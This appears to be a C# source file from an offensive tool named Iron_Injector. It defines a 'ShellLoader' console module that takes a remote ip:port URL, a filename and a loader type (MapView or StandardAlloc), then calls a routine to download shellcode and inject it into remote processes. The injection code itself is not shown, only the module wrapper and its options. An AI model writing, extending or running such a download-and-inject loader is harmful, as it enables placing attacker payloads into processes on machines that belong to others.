using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Iron_Injector.Models.Abstracts;
using Iron_Injector.Models;
using Alba.CsConsoleFormat;
using Pastel;
using System.Drawing;

namespace Iron_Injector.Commands.Shell_Commands
{
    using static System.ConsoleColor; // used by table to draw with colors.

    // moved Table and Set into ShellLoader Class as they seemed to best belong under here, while different from the main shellLoader still not special enough to get own files, and lets me make other classes with sub classes named set or table.
    public class ShellLoader : ModuleBase
    {
        public override string Name => "ShellLoader";
        public override string Description => "Loads the shell loader module. Used for injecting shellcode in various ways in remote processes.";
        public override int ID => 1;
        public override string Prompt => "[ShellLoader]> ";


        public override void setModuleOptions()
        {
            ModuleOptions = new List<OptionsBase>() // sets list in base class so it can be used with table,set,run
            {
                new OptionsBase("URL", "", true, "url to download file from. http:// is auto added so only need ip:port"),
                new OptionsBase("Filename", "", true, "filename to download."),
                new OptionsBase("LoaderType", "MapView", true, "way to load shellcode options are {MapView, StandardAlloc} more in future updates.")
            };
        }
        public override void setModuleCommands()
        {

        }

        public override void ActivateRunCommand()
        {
            Console.WriteLine($"{"[+]".Pastel(Color.Green)}Running shellcode loader stuff....");
            Download_Inject.ExecuteShellcode();
        }
    }
}
